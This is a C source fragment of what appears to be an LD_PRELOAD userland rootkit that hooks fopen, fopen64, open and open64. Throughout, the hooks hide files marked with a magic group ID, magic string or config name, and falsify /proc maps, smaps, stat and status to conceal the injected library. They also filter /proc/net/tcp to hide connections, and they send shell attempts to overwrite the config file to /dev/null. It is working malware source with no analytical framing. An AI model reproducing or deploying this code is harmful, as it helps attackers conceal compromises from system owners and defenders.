#define O_WRONLY 1
#define O_CREAT	64
#define O_TRUNC	512
// fucking lying documentation..
FILE * fopen (const char *filename, const char *mode) {
  struct stat s_fstat;
  char readlinkbuf[PATH_MAX];
  char cwd[PATH_MAX];
  getcwd(cwd,PATH_MAX);
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_fopen) old_fopen = find_sym(libc, "fopen");
  if (!old_xstat) old_xstat = find_sym(libc, "__xstat");
  if (!strcmp (filename, PROC_NET_TCP) || !strcmp(filename, PROC_NET_TCP6)) return netstat(filename);
  if(getgid() == MAGIC_GID) return old_fopen(filename,mode);
  memset (&s_fstat, 0, sizeof (stat));
  if(!fnmatch("/proc/*/maps", filename, FNM_PATHNAME))  return spoof_maps(filename);
#ifdef USE_PROCSTAT_HOOK
  if(!fnmatch("/proc/*/stat", filename, FNM_PATHNAME))  return procstat(filename);
#endif
  if(!fnmatch("/proc/*/smaps", filename, FNM_PATHNAME)) return spoof_smaps(filename);
  if(!fnmatch("/proc/*/status",filename,FNM_PATHNAME)) return procstatus(filename);
  if(!strcmp(cwd,"/proc")) {
    if(!fnmatch("*/maps", filename, FNM_PATHNAME))  return spoof_maps(filename);
#ifdef USE_PROCSTAT_HOOK
    if(!fnmatch("*/stat", filename, FNM_PATHNAME))  return procstat(filename);
#endif
    if(!fnmatch("*/status",filename,FNM_PATHNAME)) return procstatus(filename);
    if(!fnmatch("*/smaps", filename, FNM_PATHNAME))  return spoof_smaps(filename);
  }
  if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)) {
    if(!fnmatch("maps", filename, FNM_PATHNAME))  return spoof_maps(filename);
#ifdef USE_PROCSTAT_HOOK
    if(!fnmatch("stat", filename, FNM_PATHNAME))  return procstat(filename);
#endif
    if(!fnmatch("status",filename,FNM_PATHNAME)) return procstatus(filename);
    if(!fnmatch("smaps", filename, FNM_PATHNAME))  return spoof_smaps(filename);
  }
  old_xstat (_STAT_VER, filename, &s_fstat);
  readlink(filename,readlinkbuf,sizeof(readlinkbuf)-1);
  if (s_fstat.st_gid == MAGIC_GID || (strstr (filename, MAGIC_STRING))
      || (strstr (filename, CONFIG_FILE)) || (strstr(readlinkbuf,MAGIC_STRING))
      || (strstr(readlinkbuf,CONFIG_FILE)) ) {
    errno = ENOENT;
    return NULL;
  }

  return old_fopen (filename, mode);
}

FILE * fopen64 (const char *filename, const char *mode) {
  struct stat s_fstat;
  char readlinkbuf[PATH_MAX];
  char cwd[PATH_MAX];
  getcwd(cwd,PATH_MAX);
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);

  if (!old_fopen64) old_fopen64 = find_sym(libc, "fopen64");
  if(getgid() == MAGIC_GID) return old_fopen64(filename,mode);
  if (!old_xstat) old_xstat = find_sym(libc, "__xstat");
  if (!strcmp (filename, PROC_NET_TCP) || !strcmp (filename, PROC_NET_TCP6)) return netstat(filename);
  if(getgid() == MAGIC_GID) return old_fopen64(filename,mode);
  memset (&s_fstat, 0, sizeof (stat));
  if(!fnmatch("/proc/*/maps", filename, FNM_PATHNAME))  return spoof_maps(filename);
#ifdef USE_PROCSTAT_HOOK
  if(!fnmatch("/proc/*/stat", filename, FNM_PATHNAME))  return procstat(filename);
#endif
  if(!fnmatch("/proc/*/smaps", filename, FNM_PATHNAME)) return spoof_smaps(filename);
  if(!fnmatch("/proc/*/status",filename,FNM_PATHNAME)) return procstatus(filename);
  if(!strcmp(cwd,"/proc")) {
    if(!fnmatch("*/maps", filename, FNM_PATHNAME))  return spoof_maps(filename);
#ifdef USE_PROCSTAT_HOOK
    if(!fnmatch("*/stat", filename, FNM_PATHNAME))  return procstat(filename);
#endif
    if(!fnmatch("*/status",filename,FNM_PATHNAME)) return procstatus(filename);
    if(!fnmatch("*/smaps", filename, FNM_PATHNAME))  return spoof_smaps(filename);
  }
  if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)) {
    if(!fnmatch("maps", filename, FNM_PATHNAME))  return spoof_maps(filename);
#ifdef USE_PROCSTAT_HOOK
    if(!fnmatch("stat", filename, FNM_PATHNAME))  return procstat(filename);
#endif
    if(!fnmatch("status",filename,FNM_PATHNAME)) return procstatus(filename);
    if(!fnmatch("smaps", filename, FNM_PATHNAME))  return spoof_smaps(filename);
  }
  old_xstat (_STAT_VER, filename, &s_fstat);
  readlink(filename,readlinkbuf,sizeof(readlinkbuf)-1);
  if (s_fstat.st_gid == MAGIC_GID || (strstr (filename, MAGIC_STRING))
      || (strstr (filename, CONFIG_FILE)) || (strstr(readlinkbuf,MAGIC_STRING)) || (strstr(readlinkbuf,CONFIG_FILE)) ) {
    errno = ENOENT;
    return NULL;
  }

  return old_fopen64 (filename, mode);
}

int open (const char *pathname, int flags, mode_t mode) {
  struct stat s_fstat;
  char cwd[PATH_MAX];
  char *me;
  getcwd(cwd,PATH_MAX);
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_open) old_open = find_sym(libc, "open");
  if (!old_xstat) old_xstat = find_sym(libc, "__xstat");
  if (getgid() == MAGIC_GID) return old_open(pathname,flags,mode);
  if(pathname == NULL) return old_open(pathname,flags,mode);
  if(strstr(pathname,CONFIG_FILE)) {
    me = get_my_procname();
    if((strstr(me,"sh") || strstr(me,"busybox")) && (flags == (O_CREAT|O_WRONLY|O_TRUNC)))  return old_open("/dev/null",flags,mode);
  }
  memset (&s_fstat, 0, sizeof (stat));
  if(!fnmatch("/proc/*/maps", pathname, FNM_PATHNAME))  return fileno(spoof_maps(pathname));
#ifdef USE_PROCSTAT_HOOK
  if(!fnmatch("/proc/*/stat", pathname, FNM_PATHNAME))  return fileno(procstat(pathname));
#endif
  if(!fnmatch("/proc/*/smaps", pathname, FNM_PATHNAME))  return fileno(spoof_smaps(pathname));
  if(!fnmatch("/proc/*/status",pathname,FNM_PATHNAME)) return procstatus_o(pathname);
  if(!strcmp(cwd,"/proc")) {
    if(!fnmatch("*/maps", pathname, FNM_PATHNAME))  return fileno(spoof_maps(pathname));
#ifdef USE_PROCSTAT_HOOK
    if(!fnmatch("*/stat", pathname, FNM_PATHNAME))  return fileno(procstat(pathname));
#endif
    if(!fnmatch("*/smaps", pathname, FNM_PATHNAME))  return fileno(spoof_smaps(pathname));
    if(!fnmatch("*/status",pathname,FNM_PATHNAME)) return procstatus_o(pathname);
  }
  if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)) {
    if(!fnmatch("maps", pathname, FNM_PATHNAME))  return fileno(spoof_maps(pathname));

#ifdef USE_PROCSTAT_HOOK
    if(!fnmatch("stat", pathname, FNM_PATHNAME))  return fileno(procstat(pathname));
#endif
    if(!fnmatch("status",pathname,FNM_PATHNAME)) return procstatus_o(pathname);
    if(!fnmatch("smaps", pathname, FNM_PATHNAME))  return fileno(spoof_smaps(pathname));
  }
  old_xstat (_STAT_VER, pathname, &s_fstat);
  if (s_fstat.st_gid == MAGIC_GID || (strstr (pathname, MAGIC_STRING))
      || (strstr (pathname, CONFIG_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_open (pathname, flags, mode);
}
int open64 (const char *pathname, int flags, mode_t mode) {
  struct stat s_fstat;
  char cwd[PATH_MAX];
  getcwd(cwd,PATH_MAX);
  char *me;
  if (!libc) libc = dlopen (LIBC_PATH, RTLD_LAZY);
  if (!old_open64) old_open64 = find_sym(libc, "open64");
  if (!old_xstat) old_xstat = find_sym(libc, "__xstat");
  if(pathname == NULL) return old_open64(pathname,flags,mode);
  if(getgid() == MAGIC_GID) return old_open64(pathname,flags,mode);
  memset (&s_fstat, 0, sizeof (stat));
  if(strstr(pathname,CONFIG_FILE)) {
    me = get_my_procname();
    if((strstr(me,"sh") || strstr(me,"busybox")) && (flags == (O_CREAT|O_WRONLY|O_TRUNC)))  return old_open64("/dev/null",flags,mode);
  }
  if(!fnmatch("/proc/*/maps", pathname, FNM_PATHNAME))  return fileno(spoof_maps(pathname));
#ifdef USE_PROCSTAT_HOOK
  if(!fnmatch("/proc/*/stat", pathname, FNM_PATHNAME))  return fileno(procstat(pathname));
#endif
  if(!fnmatch("/proc/*/smaps", pathname, FNM_PATHNAME))  return fileno(spoof_smaps(pathname));
  if(!fnmatch("/proc/*/status",pathname,FNM_PATHNAME)) return procstatus_o(pathname);
  if(!strcmp(cwd,"/proc")) {
    if(!fnmatch("*/maps", pathname, FNM_PATHNAME))  return fileno(spoof_maps(pathname));
#ifdef USE_PROCSTAT_HOOK
    if(!fnmatch("*/stat", pathname, FNM_PATHNAME))  return fileno(procstat(pathname));
#endif
    if(!fnmatch("*/smaps", pathname, FNM_PATHNAME))  return fileno(spoof_smaps(pathname));
    if(!fnmatch("*/status",pathname,FNM_PATHNAME)) return procstatus_o(pathname);
  }
  if(!fnmatch("/proc/*", cwd, FNM_PATHNAME)) {
    if(!fnmatch("maps", pathname, FNM_PATHNAME))  return fileno(spoof_maps(pathname));

#ifdef USE_PROCSTAT_HOOK
    if(!fnmatch("stat", pathname, FNM_PATHNAME))  return fileno(procstat(pathname));
#endif
    if(!fnmatch("status",pathname,FNM_PATHNAME)) return procstatus_o(pathname);
    if(!fnmatch("smaps", pathname, FNM_PATHNAME))  return fileno(spoof_smaps(pathname));
  }
  old_xstat (_STAT_VER, pathname, &s_fstat);
  if (s_fstat.st_gid == MAGIC_GID || (strstr (pathname, MAGIC_STRING))
      || (strstr (pathname, CONFIG_FILE))) {
    errno = ENOENT;
    return -1;
  }

  return old_open64 (pathname, flags, mode);
}



